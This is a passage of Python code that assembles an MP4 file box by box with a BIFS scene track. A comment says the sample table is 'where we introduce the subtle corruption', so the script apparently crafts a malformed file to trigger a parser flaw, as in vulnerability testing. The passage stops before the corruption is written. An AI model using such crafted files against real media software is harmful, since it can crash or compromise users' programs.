ileLevelFlag (1 bit) + reserved (4 bits)\n    # We\'ll use ID=1, no URL, inline profiles\n    iod_content.write(struct.pack(\'>H\', 0x0004))  # ID=1, flags=0\n    iod_content.write(struct.pack(\'>B\', 0xFF))  # ODProfileLevelIndication\n    iod_content.write(struct.pack(\'>B\', 0xFF))  # sceneProfileLevelIndication\n    iod_content.write(struct.pack(\'>B\', 0xFE))  # audioProfileLevelIndication\n    iod_content.write(struct.pack(\'>B\', 0xFE))  # visualProfileLevelIndication\n    iod_content.write(struct.pack(\'>B\', 0xFF))  # graphicsProfileLevelIndication\n    \n    # Add ES_Descriptor for scene track (tag 0x0E = ES_ID_Inc)\n    # This references the scene track\n    iod_content.write(struct.pack(\'>BBI\', 0x0E, 4, 1))  # ES_ID_Inc tag, size, track_ID=1\n    \n    iod_data = iod_content.getvalue()\n    # Write IOD descriptor with tag and size\n    iods_data.write(struct.pack(\'>B\', 0x10))  # IOD tag\n    # Size encoding (variable length)\n    size = len(iod_data)\n    if size < 0x80:\n        iods_data.write(struct.pack(\'>B\', size))\n    else:\n        iods_data.write(struct.pack(\'>BB\', 0x80 | (size >> 7), size & 0x7F))\n    iods_data.write(iod_data)\n    \n    moov_content.write(write_fullbox(b\'iods\', 0, 0, iods_data.getvalue()))\n    \n    # trak box for BIFS scene track\n    trak_content = io.BytesIO()\n    \n    # tkhd box (track header) - enabled track\n    tkhd_data = struct.pack(\'>IIIIQHH\',\n        0,  # creation_time\n        0,  # modification_time\n        1,  # track_ID (must match ES_ID_Inc reference)\n        0,  # reserved\n        1000,  # duration\n        0, 0  # reserved\n    )\n    tkhd_data += struct.pack(\'>HHHI\', 0, 0, 0x0100, 0)  # layer, alternate_group, volume, reserved\n    tkhd_data += struct.pack(\'>IIIIIIIII\', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix\n    tkhd_data += struct.pack(\'>II\', 0, 0)  # width, height\n    trak_content.write(write_fullbox(b\'tkhd\', 0, 0x000007, tkhd_data))  # flags=7 (enabled, in movie, in preview)\n    \n    # Add tref box to mark this track as in root OD\n    tref_content = io.BytesIO()\n    # Use \'chap\' or \'mpod\' reference - actually, for BIFS we need proper OD reference\n    # Let\'s use a different approach: the track will be identified by the iods reference\n    \n    # mdia box\n    mdia_content = io.BytesIO()\n    \n    # mdhd box\n    mdhd_data = struct.pack(\'>IIIIHH\', 0, 0, 1000, 1000, 0x55c4, 0)\n    mdia_content.write(write_fullbox(b\'mdhd\', 0, 0, mdhd_data))\n    \n    # hdlr box - BIFS scene handler\n    hdlr_data = struct.pack(\'>IIII\', 0, 0, 0, 0)\n    hdlr_data += b\'sdsm\'  # Scene Description handler\n    hdlr_data += struct.pack(\'>III\', 0, 0, 0)\n    hdlr_data += b\'BIFS Scene Handler\\x00\'\n    mdia_content.write(write_fullbox(b\'hdlr\', 0, 0, hdlr_data))\n    \n    # minf box\n    minf_content = io.BytesIO()\n    \n    # nmhd box (null media header for system streams)\n    minf_content.write(write_fullbox(b\'nmhd\', 0, 0, b\'\'))\n    \n    # dinf box\n    dinf_content = io.BytesIO()\n    dref_data = struct.pack(\'>I\', 1)\n    dref_entry = struct.pack(\'>I4sI\', 12, b\'url \', 1)\n    dinf_content.write(write_fullbox(b\'dref\', 0, 0, dref_data + dref_entry))\n    minf_content.write(write_box(b\'dinf\', dinf_content.getvalue()))\n    \n    # stbl box - This is where we introduce the subtle corruption\n    stbl_content = io.BytesIO()\n    \n    # stsd box (sample description) - BIFS sample entry\n    stsd_data = struct.pack(\'>I\', 1)  # entry_count = 1\n    # mp4s entry for BIFS\n    mp4s_data = struct.pack(\'>6sH\', b\'\\x00\' * 6, 1)  # reserved, data_reference_index\n    mp4s_entry = struct.pack(\'>I4s\', 16 + len(mp4s_data), b\'mp4s\') + mp4s_data\n    stbl_content.write(write_fullbox(b\'stsd\', 0, 0, stsd_data + mp4s_entry))\n    \n    # stts box (time-to-sample) - declare 1 sample\n    stts_data = struct.pack(\'>III\', 1, 1, 1000)\n    stbl_content.write(write_fullbox(b\'stts\', 0, 0, stts_data))